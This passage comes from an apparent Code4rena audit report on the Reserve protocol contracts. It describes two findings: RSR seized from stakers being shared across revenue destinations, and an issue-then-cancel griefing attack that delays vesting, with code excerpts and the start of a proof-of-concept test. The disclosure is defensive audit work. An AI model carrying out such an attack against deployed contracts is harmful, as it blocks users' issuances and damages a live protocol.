fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/276\">[M-12] BackingManager: rsr is distributed across all rsr revenue destinations which is a loss for rsr stakers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/276\">HollaDieWaldfee</a></em></p>\n<p>The <code>BackingManager.handoutExcessAssets</code> function sends all <code>rsr</code> that the <code>BackingManager</code> holds to the <code>rsrTrader</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179</a>).</p>\n<p>The purpose of this is that <code>rsr</code> which can be held by the <code>BackingManager</code> due to seizure from the <code>StRSR</code> contract is sent back entirely to the <code>StRSR</code> contract and not - as would happen later in the function (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242</a>) - shared across <code>rsrTrader</code> and <code>rTokenTrader</code>.</p>\n<p>The <code>rsrTrader</code> then sends the <code>rsr</code> to the <code>Distributor</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65</a>).</p>\n<p>So far so good. However the <code>Distributor</code> does not necessarily send all of the <code>rsr</code> to the <code>StRSR</code> contract. Instead it distributes the <code>rsr</code> according to its distribution table. I.e. there can be multiple destinations each receiving a share of the <code>rsr</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136</a>).</p>\n<p>In economic terms, <code>rsr</code> that is thereby not sent to <code>StRSR</code> but to other destinations, is a transfer of funds from stakers to these destinations, i.e. a loss to stakers.</p>\n<p>Stakers should only pay for recollateralization of the <code>RToken</code>, not however send revenue to <code>rsr</code> revenue destinations.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assume the following situation:</p>\n<ul>\n<li>A seizure of <code>rsr</code> from the <code>StRSR</code> contract occurred because the <code>RToken</code> was under-collateralized.</li>\n<li>A trade occurred which restored collateralization. However not all <code>rsr</code> was sold by the trade and was returned to the <code>BackingManager</code>.</li>\n</ul>\n<p>Now <code>BackingManager.manageTokens</code> is called which due to the full collateralization calls <code>BackingManager.handoutExcessAssets</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118</a>).</p>\n<p>This sends <code>rsr</code> to the <code>rsrTrader</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179</a>).</p>\n<p>Then the <code>rsr</code> is sent to the <code>Distributor</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65</a>).</p>\n<p>There it is distributed across all <code>rsr</code> destinations (<a href=\"https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136\">https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136</a>).</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>rsr</code> should be sent from the <code>BackingManager</code> directly to <code>StRSR</code> without the need to go through <code>rsrTrader</code> and <code>Distributor</code>. Thereby it won’t be sent to other <code>rsr</code> revenue destinations.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 431e0796..eb506004 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -173,7 +173,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         if (rsr.balanceOf(address(this)) &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // For CEI, this is an interaction &quot;within our system&quot; even though RSR is already live</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             IERC20Upgradeable(address(rsr)).safeTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-                address(rsrTrader),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+                address(stRSR),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                 rsr.balanceOf(address(this))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         }</span></span></code></pre>\n<p>There is a caveat to this however:</p>\n<p>It is possible for <code>rsr</code> to be a reward token for a collateral of the <code>RToken</code>.</p>\n<p>Neither the current implementation nor the proposed fix addresses this and instead sends the rewards to <code>StRSR</code>.</p>\n<p>In principal, <code>rsr</code> that was rewarded should have a share that goes to the <code>rTokenTrader</code> as well as include all <code>rsr</code> revenue destinations.</p>\n<p>However there is no easy way to differentiate where the <code>rsr</code> came from.</p>\n<p>Therefore I think it is reasonable to send all <code>rsr</code> to <code>StRSR</code> and make it clear to developers and users that <code>rsr</code> rewards cannot be paid out to <code>rToken</code> holders.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/276#issuecomment-1404405069\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Yep, this one is a great find. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/276#issuecomment-1421609180\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Fixed here: <a href=\"https://github.com/reserve-protocol/protocol/pull/584\">https://github.com/reserve-protocol/protocol/pull/584</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/58\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/11\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/36\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-13-attacker-can-prevent-vesting-for-a-very-long-time\" style=\"position:relative;\"><a href=\"#m-13-attacker-can-prevent-vesting-for-a-very-long-time\" aria-label=\"m 13 attacker can prevent vesting for a very long time permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/267\">[M-13] Attacker can prevent vesting for a very long time</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/267\">immeas</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/367\">wait</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/364\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/135\">JTJabba</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/116\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/73\">hihen</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/24\">HollaDieWaldfee</a></em></p>\n<p>When a user wants to issue RTokens there is a limit of how many can be issued in the same block. This is determined in the <code>whenFinished</code> function.</p>\n<p>It looks at how many tokens the user wants to issue and then using the <code>issuanceRate</code> it calculates which block the issuance will end up in, <code>allVestAt</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">358</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">before</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">allVestAt</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// D18{block number}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// uint192 downcast is safe: block numbers are smaller than 1e38</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nowStart</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// D18{block} = D18{1} * {block}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nowStart</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">before</span><span class=\"mtk1\">) </span><span class=\"mtk12\">before</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nowStart</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">finished</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">before</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">((</span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">lastIssRate</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">lastIssRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">allVestAt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">finished</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If this is the current block and the user has no other queued issuances the issuance can be immediate otherwise it is queued to be issued after the <code>allVestAt</code> block.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vestingEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">whenFinished</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// D18{block number}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// D18{blocks} &lt;= D18{1} * {blocks}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">vestingEnd</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">left</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">right</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">CollateralStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SOUND</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// do immediate issuance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IssueItem</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">curr</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">right</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">items</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">288</span><span class=\"mtk1\">:            ? </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">right</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:            : </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">items</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">curr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">when</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vestingEnd</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// queued at vestingEnd (allVestAt)</span></span></span></code></pre>\n<p>Then in <code>vestUpTo</code> it is checked that this is vested at a later block:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">746</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IssueItem</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rightItem</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk12\">endId</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">747</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rightItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">when</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;issuance not ready&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If a user decides that they do not want to do this vesting they can cancel pending items using <code>cancel</code>, which will return the deposited tokens to them.</p>\n<p>However this cancel does not reduce the <code>allVestAt</code> state so later issuances will still be compared to this state.</p>\n<p>Hence a malicious user can issue a lot of RTokens (possibly using a flash loan) to increase <code>allVestAt</code> and then cancel their queued issuance. Since this only costs gas this can be repeated to push <code>allVestAt</code> to a very large number effectively delaying all vesting for a very long time.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A malicious user can delay issuances a very long time costing only gas.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>PoC test in <code>RToken.test.ts</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// based on &#39;Should allow the recipient to rollback minting&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;large issuance and cancel griefs later issuances&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;5000000e18&#39;</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// flashloan or rich</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Provide approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [, </span><span class=\"mtk12\">depositTokenAmounts</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">callStatic</span><span class=\"mtk1\">.</span><span class=\"mtk11\">issue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">((</span><span class=\"mtk12\">t</span><span class=\"mtk1\">, </span><span class=\"mtk12\">i</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositTokenAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">((</span><span class=\"mtk12\">t</span><span class=\"mtk1\">, </span><span class=\"mtk12\">i</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span 